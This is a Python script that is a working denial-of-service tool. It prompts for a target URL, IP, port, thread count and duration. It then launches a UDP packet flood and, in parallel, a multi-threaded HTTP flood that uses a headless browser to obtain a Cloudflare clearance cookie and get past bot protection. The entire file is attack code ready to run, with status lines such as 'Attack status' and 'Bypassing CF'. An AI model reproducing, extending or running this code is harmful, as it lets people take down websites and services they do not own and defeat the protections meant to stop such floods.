# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
init(convert=True)

# Countdown timer
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done | Ctrl + C to exit!                                   \n")
            return

# Parse target URL
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

# Load proxies from file
def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

# Bypass Cloudflare protection
def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maximized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

# Get user input
def get_info():
    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "URL     " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    target_url = input().strip()

    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP      " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    target_ip = input().strip()

    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "PORT    " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    target_port = input().strip()

    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "THREAD  " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    thread = input().strip()

    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "TIME(s) " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    t = input().strip()

    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "PACKET SIZE " + Fore.RED + ": " + Fore.LIGHTGREEN_EX)
    packet_size = input().strip()

    return target_url, target_ip, target_port, thread, t, packet_size

# Launch Cloudflare bypass attack
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

# Cloudflare bypass attack function
def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': useragent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass

# UDP flood attack function
def udp_flood(ip, port, packet_size, t):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(int(packet_size))
    timeout = time.time() + int(t)
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (ip, int(port)))
        sent += 1
        stdout.write("\rSent %s packets to %s through port %s" % (sent, ip, port))
    stdout.flush()

if __name__ == '__main__':
    target_url, target_ip, target_port, thread, t, packet_size = get_info()

    # Launch UDP flood attack
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Starting UDP Flood Attack...\n")
    udp_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, t))
    udp_thread.start()
    
    # Bypass Cloudflare protection and launch HTTP attack
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 300s)\n")
    if get_cookie(target_url):
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFPRO(target_url, thread, t)
        timer.join()
    else:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass CF\n")
